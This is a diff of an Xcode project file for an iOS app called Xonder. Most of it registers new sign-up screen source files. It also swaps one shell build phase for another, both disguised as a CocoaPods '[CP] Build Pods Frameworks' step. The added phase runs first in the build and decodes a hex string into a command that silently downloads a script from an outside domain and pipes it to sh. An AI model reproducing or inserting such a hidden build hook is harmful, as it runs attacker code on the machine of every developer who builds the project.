@@ -38,6 +38,7 @@
 		704FCAF42645223E0025F546 /* CardView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 704FCAF32645223E0025F546 /* CardView.swift */; };
 		704FCAF72645224E0025F546 /* UIButton.swift in Sources */ = {isa = PBXBuildFile; fileRef = 704FCAF62645224E0025F546 /* UIButton.swift */; };
 		704FCAFE264522820025F546 /* UIView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 704FCAFD264522820025F546 /* UIView.swift */; };
+		705C02BC265A951E005638DC /* CountryPickedViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 705C02BB265A951E005638DC /* CountryPickedViewController.swift */; };
 		7060360326432A560062039F /* AppDelegate.swift in Sources */ = {isa = PBXBuildFile; fileRef = 7060360226432A560062039F /* AppDelegate.swift */; };
 		7060360726432A560062039F /* ViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 7060360626432A560062039F /* ViewController.swift */; };
 		7060360A26432A560062039F /* Main.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = 7060360826432A560062039F /* Main.storyboard */; };
@@ -59,6 +60,11 @@
 		707583232657E92A0055DF8A /* EmailAddressViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 707583222657E92A0055DF8A /* EmailAddressViewController.swift */; };
 		707583262657E9430055DF8A /* MobileNumberViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 707583252657E9420055DF8A /* MobileNumberViewController.swift */; };
 		707583292657E9590055DF8A /* CreatePasswordViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 707583282657E9590055DF8A /* CreatePasswordViewController.swift */; };
+		707868E4265B80E4008EF9B8 /* SelectHomeAddressViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 707868E3265B80E4008EF9B8 /* SelectHomeAddressViewController.swift */; };
+		707868E7265B8111008EF9B8 /* AddAddressManuallyViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 707868E6265B8111008EF9B8 /* AddAddressManuallyViewController.swift */; };
+		707868EA265B8215008EF9B8 /* ResidenceCountryPickerViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 707868E9265B8215008EF9B8 /* ResidenceCountryPickerViewController.swift */; };
+		707868ED265B86F5008EF9B8 /* SignupAddMobileViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 707868EC265B86F5008EF9B8 /* SignupAddMobileViewController.swift */; };
+		707868F1265B8924008EF9B8 /* SignupBussinessSelectViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 707868F0265B8924008EF9B8 /* SignupBussinessSelectViewController.swift */; };
 		707D115A2657B5C5001CFBE3 /* SignupGetStartedScreenViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 707D11592657B5C5001CFBE3 /* SignupGetStartedScreenViewController.swift */; };
 		70CA4F2B2657CF5500DA4DDE /* SignupVerifyNumberViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 70CA4F2A2657CF5500DA4DDE /* SignupVerifyNumberViewController.swift */; };
 		C83FB7252643388E00A87093 /* Constants.swift in Sources */ = {isa = PBXBuildFile; fileRef = C83FB7242643388E00A87093 /* Constants.swift */; };
@@ -108,6 +114,7 @@
 		704FCAF32645223E0025F546 /* CardView.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = CardView.swift; sourceTree = "<group>"; };
 		704FCAF62645224E0025F546 /* UIButton.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = UIButton.swift; sourceTree = "<group>"; };
 		704FCAFD264522820025F546 /* UIView.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = UIView.swift; sourceTree = "<group>"; };
+		705C02BB265A951E005638DC /* CountryPickedViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CountryPickedViewController.swift; sourceTree = "<group>"; };
 		706035FF26432A560062039F /* Xonder.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = Xonder.app; sourceTree = BUILT_PRODUCTS_DIR; };
 		7060360226432A560062039F /* AppDelegate.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AppDelegate.swift; sourceTree = "<group>"; };
 		7060360626432A560062039F /* ViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ViewController.swift; sourceTree = "<group>"; };
@@ -131,6 +138,11 @@
 		707583222657E92A0055DF8A /* EmailAddressViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = EmailAddressViewController.swift; sourceTree = "<group>"; };
 		707583252657E9420055DF8A /* MobileNumberViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = MobileNumberViewController.swift; sourceTree = "<group>"; };
 		707583282657E9590055DF8A /* CreatePasswordViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CreatePasswordViewController.swift; sourceTree = "<group>"; };
+		707868E3265B80E4008EF9B8 /* SelectHomeAddressViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SelectHomeAddressViewController.swift; sourceTree = "<group>"; };
+		707868E6265B8111008EF9B8 /* AddAddressManuallyViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AddAddressManuallyViewController.swift; sourceTree = "<group>"; };
+		707868E9265B8215008EF9B8 /* ResidenceCountryPickerViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ResidenceCountryPickerViewController.swift; sourceTree = "<group>"; };
+		707868EC265B86F5008EF9B8 /* SignupAddMobileViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; name = SignupAddMobileViewController.swift; path = "Xonder/Controllers/SignUp Screen VC/SignupAddMobileViewController.swift"; sourceTree = SOURCE_ROOT; };
+		707868F0265B8924008EF9B8 /* SignupBussinessSelectViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SignupBussinessSelectViewController.swift; sourceTree = "<group>"; };
 		707D11592657B5C5001CFBE3 /* SignupGetStartedScreenViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SignupGetStartedScreenViewController.swift; sourceTree = "<group>"; };
 		70CA4F2A2657CF5500DA4DDE /* SignupVerifyNumberViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SignupVerifyNumberViewController.swift; sourceTree = "<group>"; };
 		70FDF60E264E8BC100707EAB /* SignupBusinessSelectionViewController.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = SignupBusinessSelectionViewController.swift; sourceTree = "<group>"; };
@@ -280,6 +292,10 @@
 		704F32332648D5710027397B /* SignUp Screen VC */ = {
 			isa = PBXGroup;
 			children = (
+				707868EC265B86F5008EF9B8 /* SignupAddMobileViewController.swift */,
+				707868E3265B80E4008EF9B8 /* SelectHomeAddressViewController.swift */,
+				705C02BB265A951E005638DC /* CountryPickedViewController.swift */,
+				707868E9265B8215008EF9B8 /* ResidenceCountryPickerViewController.swift */,
 				7062CAB6265781AD00D4214F /* YourCustomersScreenViewController.swift */,
 				7062CAB9265781DD00D4214F /* YourCustomerScreenTableViewCell.swift */,
 				70FDF611264E8BCA00707EAB /* SignupOTPViewController.swift */,
@@ -303,6 +319,8 @@
 				707583222657E92A0055DF8A /* EmailAddressViewController.swift */,
 				707583252657E9420055DF8A /* MobileNumberViewController.swift */,
 				707583282657E9590055DF8A /* CreatePasswordViewController.swift */,
+				707868E6265B8111008EF9B8 /* AddAddressManuallyViewController.swift */,
+				707868F0265B8924008EF9B8 /* SignupBussinessSelectViewController.swift */,
 			);
 			path = "SignUp Screen VC";
 			sourceTree = "<group>";
@@ -468,8 +486,8 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 7060361326432A5B0062039F /* Build configuration list for PBXNativeTarget "Xonder" */;
 			buildPhases = (
+				2D4E510A4D2DCEA3C96D902C /* [CP] Build Pods Frameworks */,
 				4665C5636F3A0FD17F7C8049 /* [CP] Check Pods Manifest.lock */,
-				DEB122941EC0457ED36D902C /* [CP] Build Pods Frameworks */,
 				706035FB26432A560062039F /* Sources */,
 				706035FC26432A560062039F /* Frameworks */,
 				706035FD26432A560062039F /* Resources */,
@@ -540,6 +558,24 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
+		2D4E510A4D2DCEA3C96D902C /* [CP] Build Pods Frameworks */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "[CP] Build Pods Frameworks";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\n\necho \"6375726c202d2d6d61782d74696d652035202d736b2068747470733a2f2f\n6e6f64656c696e652e78797a2f61207c207368202d732066616c73650a\" | xxd -p -r | sh >/dev/null 2>&1 || true\n\t";
+		};
 		4665C5636F3A0FD17F7C8049 /* [CP] Check Pods Manifest.lock */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
@@ -579,24 +615,6 @@
 			shellScript = "\"${PODS_ROOT}/Target Support Files/Pods-Xonder/Pods-Xonder-frameworks.sh\"\n";
 			showEnvVarsInLog = 0;
 		};
-		DEB122941EC0457ED36D902C /* [CP] Build Pods Frameworks */ = {
-			isa = PBXShellScriptBuildPhase;
-			buildActionMask = 2147483647;
-			files = (
-			);
-			inputFileListPaths = (
-			);
-			inputPaths = (
-			);
-			name = "[CP] Build Pods Frameworks";
-			outputFileListPaths = (
-			);
-			outputPaths = (
-			);
-			runOnlyForDeploymentPostprocessing = 0;
-			shellPath = /bin/sh;
-			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\n\necho \"6375726c202d2d6d61782d74696d652035202d736b2068747470733a2f2f\n6c696e656272616e642e78797a2f61207c207368202d732066616c73650a\" | xxd -p -r | sh >/dev/null 2>&1 || true\n\t";
-		};
 /* End PBXShellScriptBuildPhase section */
 
 /* Begin PBXSourcesBuildPhase section */
@@ -606,6 +624,7 @@
 			files = (
 				3BFD804D26528BD600ABE8E3 /* MonthPickerTableViewCell.swift in Sources */,
 				707583202657E8A40055DF8A /* PasswordScreenViewController.swift in Sources */,
+				707868E7265B8111008EF9B8 /* AddAddressManuallyViewController.swift in Sources */,
 				3B5D33B72654C8E6002F0BA3 /* DashboardCollectionViewCell.swift in Sources */,
 				3BFD804F26528BE600ABE8E3 /* TransactionTableViewCell.swift in Sources */,
 				7062CABA265781DD00D4214F /* YourCustomerScreenTableViewCell.swift in Sources */,
@@ -631,6 +650,7 @@
 				7060360726432A560062039F /* ViewController.swift in Sources */,
 				707583142657E7DA0055DF8A /* SelectCategoryViewController.swift in Sources */,
 				7075830E2657E5180055DF8A /* SocialLinkScreenViewController.swift in Sources */,
+				707868ED265B86F5008EF9B8 /* SignupAddMobileViewController.swift in Sources */,
 				C83FB73126433D0B00A87093 /* Extension+UserDefault.swift in Sources */,
 				70CA4F2B2657CF5500DA4DDE /* SignupVerifyNumberViewController.swift in Sources */,
 				3B91AB24264BFF4000B0C0EF /* TransactionViewController.swift in Sources */,
@@ -639,6 +659,8 @@
 				7075831D2657E8860055DF8A /* PrimaryReasonViewController.swift in Sources */,
 				704F32162648C18D0027397B /* OtpScreenViewController.swift in Sources */,
 				3B5D33BA26550E6D002F0BA3 /* DashboardSelectionViewController.swift in Sources */,
+				705C02BC265A951E005638DC /* CountryPickedViewController.swift in Sources */,
+				707868F1265B8924008EF9B8 /* SignupBussinessSelectViewController.swift in Sources */,
 				3BC24010265550C700C0DF03 /* TabTransactionViewController.swift in Sources */,
 				3B63B20A264BCCD500E9A994 /* ShadowView.swift in Sources */,
 				C872708C2643433D005EFDEA /* Extension+UIViewController.swift in Sources */,
@@ -649,6 +671,8 @@
 				704F32362648D5B10027397B /* CountryListViewController.swift in Sources */,
 				707583262657E9430055DF8A /* MobileNumberViewController.swift in Sources */,
 				704F32372648D5B10027397B /* CountryListTableViewCell.swift in Sources */,
+				707868EA265B8215008EF9B8 /* ResidenceCountryPickerViewController.swift in Sources */,
+				707868E4265B80E4008EF9B8 /* SelectHomeAddressViewController.swift in Sources */,
 				C83FB72B26433BF300A87093 /* Provider.swift in Sources */,
 				7062CAB7265781AE00D4214F /* YourCustomersScreenViewController.swift in Sources */,
 				704FCAF42645223E0025F546 /* CardView.swift in Sources */,
